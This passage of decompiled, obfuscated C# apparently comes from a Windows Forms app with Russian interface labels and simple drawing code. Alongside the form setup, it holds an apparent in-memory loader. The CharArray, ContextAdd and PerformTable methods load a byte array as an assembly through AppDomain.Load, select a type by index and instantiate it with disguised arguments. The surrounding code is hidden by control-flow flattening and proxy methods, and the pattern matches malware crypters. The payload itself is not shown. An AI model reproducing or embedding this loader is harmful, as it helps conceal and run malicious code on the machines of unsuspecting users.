					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -452575805) ^ 0x4EF494D7;
					continue;
				case 24u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -725835455) ^ -972041451;
					continue;
				case 23u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -292164359) ^ -2024025699;
					continue;
				case 22u:
					num = ((int)num2 * -1107833000) ^ -968050317;
					continue;
				case 21u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 757144406;
						num5 = 757144406;
					}
					else
					{
						num4 = 1728605540;
						num5 = 1728605540;
					}
					num = num4 ^ ((int)num2 * -344606937);
					continue;
				}
				case 20u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)(num2 * 990580723) ^ -681898258;
					continue;
				case 19u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)(num2 * 590339539) ^ -1553941412;
					continue;
				case 18u:
				{
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -1811686817) ^ -1736329891;
					continue;
				}
				case 17u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -243048821) ^ -1131501148;
					continue;
				case 16u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 1297277911) ^ 0x60F8F694);
					continue;
				case 15u:
					Form1.smethod_64((Control)(object)button2, 4);
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)((num2 * 107048580) ^ 0x5E8CFB72);
					continue;
				case 14u:
					num3++;
					num = ((int)num2 * -1749442280) ^ -2130078916;
					continue;
				case 13u:
					num = ((int)num2 * -1082608932) ^ -980291738;
					continue;
				case 12u:
					Form1.smethod_62(pictureBox1, 0);
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -283922072) ^ -1519924745;
					continue;
				case 11u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)(num2 * 2073207191) ^ -997100002;
					continue;
				case 10u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -1599877555) ^ 0x7191C223;
					continue;
				case 9u:
					num = ((int)num2 * -2116174273) ^ 0x45BBBA8F;
					continue;
				case 8u:
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					num = ((int)num2 * -633635738) ^ -1564061407;
					continue;
				case 7u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 1234933807) ^ 0x30A0F4DE);
					continue;
				case 6u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 334202536) ^ -270815685;
					continue;
				case 5u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					string_ = Veet.Sa;
					num = ((int)num2 * -519369446) ^ -986076972;
					continue;
				case 4u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1227638941) ^ 0x712329B1;
					continue;
				case 3u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 1256533523) ^ -245876829;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 1032542339) ^ -239317240;
					continue;
				case 1u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -766272371) ^ -293200224;
					continue;
				case 0u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -397465137) ^ 0x27FB30BE;
					continue;
				default:
					return;
				case 68u:
					break;
				case 109u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		while (true)
		{
			int num = 351444249;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x348F982u) % 3u)
				{
				case 2u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0003:
				Assembly q = ContextAdd(Level);
				PerformTable(q);
				num = ((int)num2 * -1916724358) ^ 0x4A53D52D;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		return Form1.smethod_94(Form1.smethod_93(), Position);
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
